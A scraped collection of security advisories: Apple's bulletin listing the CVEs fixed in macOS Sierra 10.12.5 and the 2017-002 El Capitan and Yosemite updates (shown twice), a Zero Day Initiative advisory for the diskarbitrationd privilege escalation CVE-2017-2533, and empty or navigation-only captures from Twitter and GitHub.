=== Content from support.apple.com_eb277205_20250125_132352.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

This document describes the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

Released May 15, 2017

**802.1X**

Available for: macOS Sierra 10.12.4

Impact: A malicious network with 802.1X authentication may be able to capture user network credentials

Description: A certificate validation issue existed in EAP-TLS when a certificate changed. This issue was addressed through improved certificate validation.

CVE-2017-6988: Tim Cappalli of Aruba, a Hewlett Packard Enterprise company

**Accessibility Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain system privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6978: Ian Beer of Google Project Zero

**CoreAnimation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Processing maliciously crafted data may lead to arbitrary code execution

Description: A memory consumption issue was addressed through improved memory handling.

CVE-2017-2527: Ian Beer of Google Project Zero

**CoreAudio**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2502: Yangkang (@dnpushme) of Qihoo360 Qex Team

**CoreFoundation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2522: Ian Beer of Google Project Zero

Entry added May 19, 2017

**CoreText**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Processing a maliciously crafted file may lead to application termination

Description: A denial of service issue was addressed through improved validation.

CVE-2017-7003: Jake Davis of SPYSCAPE (@DoubleJake), João Henrique Neves and Stephen Goldberg of Salesforce

Entry updated June 7, 2017

**DiskArbitration**

Available for: macOS Sierra 10.12.4 and OS X El Capitan 10.11.6

Impact: An application may be able to gain system privileges

Description: A race condition was addressed with additional filesystem restrictions.

CVE-2017-2533: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Foundation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2523: Ian Beer of Google Project Zero

Entry added May 19, 2017

**HFS**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-6990: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted book may open arbitrary websites without user permission

Description: A URL handling issue was addressed through improved state management.

CVE-2017-2497: Jun Kokatsu (@shhnjk)

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to execute arbitrary code with root privileges

Description: An issue existed within the path validation logic for symlinks. This issue was addressed through improved path sanitization.

CVE-2017-6981: evi1m0 of YSRC (sec.ly.com)

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6986: evi1m0 of YSRC (sec.ly.com) & Heige (SuperHei) of Knownsec 404 Security Team

**Intel Graphics Driver**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2503: sss and Axis of 360Nirvan team

**IOGraphics**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2545: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

**IOSurface**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain kernel privileges

Description: A race condition was addressed through improved locking.

CVE-2017-6979: Adam Donenfeld (@doadam) of the Zimperium zLabs Team

Entry updated May 17, 2017

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2494: Jann Horn of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A race condition was addressed through improved locking.

CVE-2017-2501: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2507: Ian Beer of Google Project Zero

CVE-2017-2509: Jann Horn of Google Project Zero

CVE-2017-6987: Patrick Wardle of Synack

**Kernel**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2516: Jann Horn of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2546: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

**Multi-Touch**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2542: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

CVE-2017-2543: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

**NVIDIA Graphics Drivers**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6985: Axis and sss of Nirvan Team of Qihoo 360 and Simon Huang (@HuangShaomang) of IceSword Lab of Qihoo 360

**Sandbox**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2512: Federico Bento of Faculty of Sciences, University of Porto

**Security**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to escape its sandbox

Description: A resource exhaustion issue was addressed through improved input validation.

CVE-2017-2535: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Security**

Available for: macOS Sierra 10.12.4

Impact: A local application may be able to send privileged XPC messages without entitlements

Description: A race condition was addressed with improved consistency checks.

CVE-2017-7004: Ian Beer of Google Project Zero

Entry added June 8, 2017

**Speech Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: An access issue was addressed through additional sandbox restrictions.

CVE-2017-2534: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Speech Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6977: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2513: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A buffer overflow issue was addressed through improved memory handling.

CVE-2017-2518: found by OSS-Fuzz

CVE-2017-2520: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2519: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed with improved input validation.

CVE-2017-6983: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-6991: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7000: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7001: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7002: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

Entry updated May 24, 2017

**TextInput**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2524: Ian Beer of Google Project Zero

**WindowServer**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain system privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2537: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-2541: Richard Zhu (fluorescence) working with Trend Micro's Zero Day Initiative

CVE-2017-2548: Team Sniper (Keen Lab and PC Mgr) working with Trend Micro's Zero Day Initiative

**WindowServer**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2540: Richard Zhu (fluorescence) working with Trend Micro's Zero Day Initiative

## Additional recognition

**Kernel**

We would like to acknowledge Jann Horn of Google Project Zero for their assistance.

**CFNetwork**

We would like to acknowledge Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative for their assistance.

macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite includes the security content of [Safari 10.1.1](https://support.apple.com/kb/HT207804).

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

[United States](https://support.apple.com/en-us/103450/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.zerodayinitiative.com_6e0bd88f_20250125_132351.html ===

[![thezdi](/images/logo.svg)](/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
  [SIGN UP](/portal/register/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy/)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
* [SIGN UP](/portal/register/)

* [![thezdi](/images/logo.svg)](/)
* [Trend Micro](https://www.trendmicro.com/)

# Advisory Details

May 18th, 2017
## (Pwn2Own) Apple macOS diskarbitrationd Time-Of-Check/Time-Of-Use Privilege Escalation Vulnerability

### ZDI-17-357ZDI-CAN-4580

| CVE ID | [CVE-2017-2533](https://www.cve.org/CVERecord?id=CVE-2017-2533) |
| --- | --- |
| CVSS SCORE | 6.9, [AV:L/AC:M/Au:N/C:C/I:C/A:C](http://nvd.nist.gov/cvss.cfm?calculator&version=2.0&vector=AV:L/AC:M/Au:N/C:C/I:C/A:C) |
| AFFECTED VENDORS | [Apple](http://www.apple.com) |
| AFFECTED PRODUCTS | macOS |
| VULNERABILITY DETAILS | This vulnerability allows local attackers to escalate privileges on vulnerable installations of Apple macOS. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.  The specific flaw exists within the diskarbitrationd service. The issue lies in the lack of proper validation of paths prior to using them. An attacker can leverage this vulnerability to escalate privileges under the context of root. |
| ADDITIONAL DETAILS | Apple has issued an update to correct this vulnerability. More details can be found at: |
| DISCLOSURE TIMELINE | * 2017-03-17 - Vulnerability reported to vendor * 2017-05-18 - Coordinated public release of advisory |
| CREDIT | Niklas Baumstark and Samuel Groß |

[BACK TO ADVISORIES](/advisories/)

### General Inquiries

zdi@trendmicro.com

### Find us on X

[@thezdi](https://twitter.com/thezdi)

### Find us on Mastodon

[Mastodon](https://infosec.exchange/%40thezdi)

### Media Inquiries

media\_relations@trendmicro.com

### Sensitive Email Communications

[PGP Key](https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc)

[WHO WE ARE](/about/)

* [Our Mission](/about/)
* [Trend Micro](https://www.trendmicro.com)
* [TippingPoint IPS](https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html)

[HOW IT WORKS](/about/benefits/)

* [Process](/about/benefits/#process)
* [Researcher Rewards](/about/benefits/#researcher-rewards)
* [FAQS](/about/faq/)
* [Privacy](https://www.trendmicro.com/privacy/)

[ADVISORIES](/advisories)

* [Published Advisories](/advisories/published)
* [Upcoming Advisories](/advisories/upcoming)
* [RSS Feeds](/rss)

[BLOG](/blog)

[![thezdi](/images/logo-footer.svg)](/)



=== Content from support.apple.com_e68bd9eb_20250126_085423.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

This document describes the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

Released May 15, 2017

**802.1X**

Available for: macOS Sierra 10.12.4

Impact: A malicious network with 802.1X authentication may be able to capture user network credentials

Description: A certificate validation issue existed in EAP-TLS when a certificate changed. This issue was addressed through improved certificate validation.

CVE-2017-6988: Tim Cappalli of Aruba, a Hewlett Packard Enterprise company

**Accessibility Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain system privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6978: Ian Beer of Google Project Zero

**CoreAnimation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Processing maliciously crafted data may lead to arbitrary code execution

Description: A memory consumption issue was addressed through improved memory handling.

CVE-2017-2527: Ian Beer of Google Project Zero

**CoreAudio**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2502: Yangkang (@dnpushme) of Qihoo360 Qex Team

**CoreFoundation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2522: Ian Beer of Google Project Zero

Entry added May 19, 2017

**CoreText**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Processing a maliciously crafted file may lead to application termination

Description: A denial of service issue was addressed through improved validation.

CVE-2017-7003: Jake Davis of SPYSCAPE (@DoubleJake), João Henrique Neves and Stephen Goldberg of Salesforce

Entry updated June 7, 2017

**DiskArbitration**

Available for: macOS Sierra 10.12.4 and OS X El Capitan 10.11.6

Impact: An application may be able to gain system privileges

Description: A race condition was addressed with additional filesystem restrictions.

CVE-2017-2533: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Foundation**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2523: Ian Beer of Google Project Zero

Entry added May 19, 2017

**HFS**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-6990: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted book may open arbitrary websites without user permission

Description: A URL handling issue was addressed through improved state management.

CVE-2017-2497: Jun Kokatsu (@shhnjk)

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to execute arbitrary code with root privileges

Description: An issue existed within the path validation logic for symlinks. This issue was addressed through improved path sanitization.

CVE-2017-6981: evi1m0 of YSRC (sec.ly.com)

**iBooks**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6986: evi1m0 of YSRC (sec.ly.com) & Heige (SuperHei) of Knownsec 404 Security Team

**Intel Graphics Driver**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2503: sss and Axis of 360Nirvan team

**IOGraphics**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2545: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

**IOSurface**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain kernel privileges

Description: A race condition was addressed through improved locking.

CVE-2017-6979: Adam Donenfeld (@doadam) of the Zimperium zLabs Team

Entry updated May 17, 2017

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2494: Jann Horn of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A race condition was addressed through improved locking.

CVE-2017-2501: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2507: Ian Beer of Google Project Zero

CVE-2017-2509: Jann Horn of Google Project Zero

CVE-2017-6987: Patrick Wardle of Synack

**Kernel**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2516: Jann Horn of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2546: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

**Multi-Touch**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2542: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

CVE-2017-2543: 360 Security (@mj0011sec) working with Trend Micro's Zero Day Initiative

**NVIDIA Graphics Drivers**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to gain kernel privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6985: Axis and sss of Nirvan Team of Qihoo 360 and Simon Huang (@HuangShaomang) of IceSword Lab of Qihoo 360

**Sandbox**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2512: Federico Bento of Faculty of Sciences, University of Porto

**Security**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to escape its sandbox

Description: A resource exhaustion issue was addressed through improved input validation.

CVE-2017-2535: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Security**

Available for: macOS Sierra 10.12.4

Impact: A local application may be able to send privileged XPC messages without entitlements

Description: A race condition was addressed with improved consistency checks.

CVE-2017-7004: Ian Beer of Google Project Zero

Entry added June 8, 2017

**Speech Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: An access issue was addressed through additional sandbox restrictions.

CVE-2017-2534: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**Speech Framework**

Available for: macOS Sierra 10.12.4

Impact: An application may be able to escape its sandbox

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-6977: Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2513: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A buffer overflow issue was addressed through improved memory handling.

CVE-2017-2518: found by OSS-Fuzz

CVE-2017-2520: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: A maliciously crafted SQL query may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2519: found by OSS-Fuzz

**SQLite**

Available for: macOS Sierra 10.12.4

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed with improved input validation.

CVE-2017-6983: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-6991: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7000: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7001: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-7002: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

Entry updated May 24, 2017

**TextInput**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: Parsing maliciously crafted data may lead to arbitrary code execution

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2524: Ian Beer of Google Project Zero

**WindowServer**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to gain system privileges

Description: A memory corruption issue was addressed with improved memory handling.

CVE-2017-2537: Chaitin Security Research Lab (@ChaitinTech) working with Trend Micro's Zero Day Initiative

CVE-2017-2541: Richard Zhu (fluorescence) working with Trend Micro's Zero Day Initiative

CVE-2017-2548: Team Sniper (Keen Lab and PC Mgr) working with Trend Micro's Zero Day Initiative

**WindowServer**

Available for: macOS Sierra 10.12.4, OS X El Capitan 10.11.6, and OS X Yosemite 10.10.5

Impact: An application may be able to read restricted memory

Description: A validation issue was addressed with improved input sanitization.

CVE-2017-2540: Richard Zhu (fluorescence) working with Trend Micro's Zero Day Initiative

## Additional recognition

**Kernel**

We would like to acknowledge Jann Horn of Google Project Zero for their assistance.

**CFNetwork**

We would like to acknowledge Samuel Groß and Niklas Baumstark working with Trend Micro's Zero Day Initiative for their assistance.

macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite includes the security content of [Safari 10.1.1](https://support.apple.com/kb/HT207804).

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of macOS Sierra 10.12.5, Security Update 2017-002 El Capitan, and Security Update 2017-002 Yosemite

[United States](https://support.apple.com/en-us/103450/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from twitter.com_2895f56f_20250126_085420.html ===



=== Content from github.com_bef157ae_20250126_085422.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphoenhex%2Ffiles)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphoenhex%2Ffiles)

